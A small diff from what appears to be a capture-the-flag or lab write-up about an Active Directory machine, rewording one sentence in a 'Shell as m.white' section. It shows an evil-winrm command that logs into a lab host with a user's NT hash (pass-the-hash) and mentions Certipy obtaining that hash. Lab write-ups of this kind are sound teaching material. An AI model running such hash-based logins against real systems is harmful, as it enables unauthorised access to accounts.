@@ -563,7 +563,7 @@ That gives us `m.white`'s NT hash. Certipy gets that hash by requesting a Kerber
 
 ## Shell as m.white (user.txt)
 
-We try the hash against WinRM on WS-IT. NTLM authenticates with the hash itself, so there is nothing left to crack.
+We log in to WS-IT over WinRM with `m.white`'s NT hash.
 
 ```
 evil-winrm -i 10.0.0.6 -u 'm.white' -H '1b4f4e8d871ad063ffded46cc620bbf6'
